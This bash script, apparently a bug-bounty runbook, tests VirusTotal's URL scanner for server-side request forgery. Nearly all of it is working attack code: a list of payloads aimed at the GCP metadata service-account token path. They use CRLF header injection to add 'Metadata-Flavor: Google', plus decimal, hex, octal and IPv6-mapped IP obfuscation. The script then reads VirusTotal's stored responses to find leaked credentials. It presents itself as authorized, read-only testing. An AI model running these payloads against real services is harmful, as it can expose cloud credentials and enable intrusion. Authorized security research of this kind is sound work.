#!/usr/bin/env bash
# =============================================================================
# Google VRP — VT SSRF escalation v2: CORRECT read path + advanced obfuscation
# Portable: Termux / Linux / Pi.
#
# v1 bug: computed the VT url-object id from the RAW url, but VT canonicalizes,
# so injection payloads were read under the wrong id (false 'None'). v2: use the
# analysis id VT returns -> resolve meta.url_info.id (the REAL canonical id) ->
# read the stored fetch. Plus a richer, intelligent obfuscation set to inject
# Metadata-Flavor: Google and flip a SENSITIVE IMDS path 403->200.
#
# Flow: submit ALL payloads first, wait, then read each via its analysis id.
#
# SAFETY: read-only authorized VRP testing (issue 523823039). Bodies NEVER printed
# (only status/Server/len/sha). A 200 on a token/service-account path = LIVE GCP
# creds in VT public corpus = CRITICAL upgrade -> report, NEVER use. Free-tier paced.
#
# Run: VT_KEY=<key> OUTDIR=$HOME/vtssrf2 \
#   bash runbooks/PI-RUNBOOK-vt-ssrf-escalate2.sh 2>&1 | tee $HOME/vtssrf2/run.log
# =============================================================================
set -o pipefail
OUTDIR="${OUTDIR:-$HOME/vtssrf2}"; export OUTDIR; mkdir -p "$OUTDIR"
: "${VT_KEY:?set VT_KEY=<your free VirusTotal Community api key>}"
UA='vt-research/1.0 (authorized VRP testing, issue 523823039)'
B="https://www.virustotal.com/api/v3"
PACE="${PACE:-16}"
echo "============================================================"
echo "VT SSRF ESCALATION v2  $(date -u '+%Y-%m-%dT%H:%M:%SZ')  IP: $(curl -s ifconfig.me)"
echo "Correct id resolution + advanced obfuscation. Bodies never printed."
echo "============================================================"; echo ""

TOK='computeMetadata/v1/instance/service-accounts/default/token'
# advanced obfuscation payload set
PAYLOADS=(
 # --- CRLF header injection, encoding variants ---
 "http://169.254.169.254/$TOK%0d%0aMetadata-Flavor:%20Google"
 "http://169.254.169.254/$TOK%0aMetadata-Flavor:Google"
 "http://169.254.169.254/$TOK%0d%0aMetadata-Flavor:Google%0d%0a%0d%0a"
 "http://169.254.169.254/$TOK%250d%250aMetadata-Flavor:Google"
 "http://169.254.169.254/$TOK%E5%98%8A%E5%98%8DMetadata-Flavor:Google"
 "http://169.254.169.254/$TOK?x=1%0d%0aMetadata-Flavor:%20Google"
 "http://169.254.169.254/$TOK%23%0d%0aMetadata-Flavor:Google"
 "http://169.254.169.254/$TOK%09Metadata-Flavor:Google"
 # --- IP obfuscation (different parser) + CRLF ---
 "http://2852039166/$TOK%0d%0aMetadata-Flavor:%20Google"
 "http://0xA9FEA9FE/$TOK%0d%0aMetadata-Flavor:%20Google"
 "http://0251.0376.0251.0376/$TOK%0d%0aMetadata-Flavor:Google"
 "http://[::ffff:169.254.169.254]/$TOK%0d%0aMetadata-Flavor:Google"
 # --- IP obfuscation, plain (does it reach IMDS at all via these forms?) ---
 "http://2852039166/$TOK"
 "http://0xA9FEA9FE/$TOK"
 "http://[::ffff:a9fe:a9fe]/$TOK"
 # --- alternate resolver + CRLF ---
 "http://169.254.169.254.sslip.io/$TOK%0d%0aMetadata-Flavor:%20Google"
 # --- header via userinfo / weird authority ---
 "http://169.254.169.254%0d%0aMetadata-Flavor:Google@169.254.169.254/$TOK"
 # --- non-token sensitive paths (no header needed if a legacy path leaks) ---
 "http://169.254.169.254/computeMetadata/v1/project/project-id%0d%0aMetadata-Flavor:Google"
)

echo "═══ PHASE A: submit all payloads ═══"
: > "$OUTDIR/ids.tsv"; i=0
for U in "${PAYLOADS[@]}"; do
  i=$((i+1))
  code=$(curl -s -o "$OUTDIR/sub$i.json" -w '%{http_code}' --max-time 25 \
    -H "x-apikey: $VT_KEY" -H "User-Agent: $UA" --data-urlencode "url=$U" "$B/urls" 2>/dev/null)
  if [ "$code" = "200" ]; then
    aid=$(python3 -c "import json;print(json.load(open('$OUTDIR/sub$i.json'))['data']['id'])" 2>/dev/null)
    printf '%s\t%s\t%s\n' "$i" "$aid" "$U" >> "$OUTDIR/ids.tsv"
    echo "  [$i] submitted (analysis $aid)"
  else
    echo "  [$i] submit HTTP $code: $(head -c 90 "$OUTDIR/sub$i.json"|tr -d '\n')"
  fi
  sleep "$PACE"
done
echo ""
echo "  waiting 45s for scans to complete..."; sleep 45

echo "═══ PHASE B: resolve canonical id + read stored IMDS response ═══"
: > "$OUTDIR/HITS.txt"
while IFS=$'\t' read -r idx aid url; do
  [ -z "$aid" ] && continue
  # analysis -> canonical url object id
  curl -s --max-time 25 -H "x-apikey: $VT_KEY" -H "User-Agent: $UA" "$B/analyses/$aid" -o "$OUTDIR/an$idx.json" 2>/dev/null
  uid=$(python3 -c "import json;print(json.load(open('$OUTDIR/an$idx.json')).get('meta',{}).get('url_info',{}).get('id',''))" 2>/dev/null)
  sleep "$PACE"
  if [ -z "$uid" ]; then echo "  [$idx] analysis not ready / no url_info"; continue; fi
  curl -s --max-time 25 -H "x-apikey: $VT_KEY" -H "User-Agent: $UA" "$B/urls/$uid" -o "$OUTDIR/u$idx.json" 2>/dev/null
  python3 - "$OUTDIR/u$idx.json" "$url" "$idx" <<'PY'
import sys,json,os
try: d=json.load(open(sys.argv[1])); a=d['data']['attributes']
except Exception as e: print(f"  [{sys.argv[3]}] read err:", str(e)[:70]); sys.exit()
sc=a.get('last_http_response_code'); hdr=a.get('last_http_response_headers') or {}
srv=hdr.get('Server'); fl=hdr.get('Metadata-Flavor'); ln=a.get('last_http_response_content_length')
sha=a.get('last_http_response_content_sha256')
final=a.get('last_final_url') or a.get('url')
print(f"  [{sys.argv[3]}] http={sc} Server={srv!r} Metadata-Flavor={fl!r} len={ln} sha={str(sha)[:12]}")
sens = ('service-accounts' in sys.argv[2]) or ('project-id' in sys.argv[2]) or ('/project/' in sys.argv[2])
if sc==200 and sens:
    print("    *** ESCALATION: sensitive IMDS path returned 200 — LIVE metadata/token")
    print("    *** now in VT public corpus. DO NOT use. CRITICAL upgrade to issue 523823039.")
    open(os.environ['OUTDIR']+"/HITS.txt","a").write(sys.argv[2]+"\n")
PY
  sleep "$PACE"
done < "$OUTDIR/ids.tsv"
echo ""
echo "════════════════════════════════════════════"
if [ -s "$OUTDIR/HITS.txt" ]; then
  echo "  *** ESCALATION CONFIRMED:"; sed 's/^/    /' "$OUTDIR/HITS.txt"
  echo "  -> Upgrade issue 523823039 to HIGH. Comment with the exact submitted URL +"
  echo "  VT url-object id proving 200 on a sensitive path. NEVER use the credential."
else
  echo "  No escalation even with advanced obfuscation + correct read path."
  echo "  => VT's HTTP client sanitizes CRLF/header injection; v1 sensitive paths need"
  echo "  Metadata-Flavor which we cannot inject. The LOW ceiling on 523823039 is now"
  echo "  DEFINITIVELY confirmed. Let it ride; return to Looker Studio (higher EV)."
fi
echo "Evidence: $OUTDIR (bodies never stored)"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
